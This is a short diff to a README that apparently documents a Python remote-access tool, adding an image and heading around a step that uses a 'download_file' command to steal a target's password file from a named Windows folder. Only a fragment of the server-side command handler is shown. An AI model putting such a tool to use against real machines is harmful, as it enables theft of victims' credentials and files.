@@ -166,7 +166,10 @@ of our program using ``` Custom_Dir ``` command and then choosing ``` c:\\ ```:
 ##
 :star: Let's start downloading files from our target using ``` download_file  ``` command to run the following part of our program:
 Here we want to steel his `MY-PASSWORD` file including all his password located on this path ```C:\Users\mrgt7\Desktop\My-Documents\documents```.
+##
+<img src=images/15.PNG  alt="alt text" width="950" height="550">
 
+##
 ```python
     elif command == "download_file":
         conn.send(command.encode())
